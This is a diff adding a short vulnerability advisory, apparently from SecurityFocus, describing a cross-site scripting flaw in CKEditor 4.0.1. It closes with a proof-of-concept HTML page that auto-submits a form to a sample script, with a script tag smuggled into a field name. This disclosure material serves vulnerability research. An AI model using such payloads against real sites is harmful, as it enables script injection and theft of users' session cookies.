@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/58045/info
+
+CKEditor is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input. 
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+CKEditor 4.0.1 is vulnerable; other versions may also be affected.
+
+<body onload="javascript:document.forms[0].submit()">
+<form name="form1" method="post" action="http://www.example.com/admin/ckeditor/samples/sample_posteddata.php" enctype="multipart/form-data">
+<input type="hidden" name="<script>alert('AkaStep');</script>" id="fupl" value="SENDF"></li>
+</form>
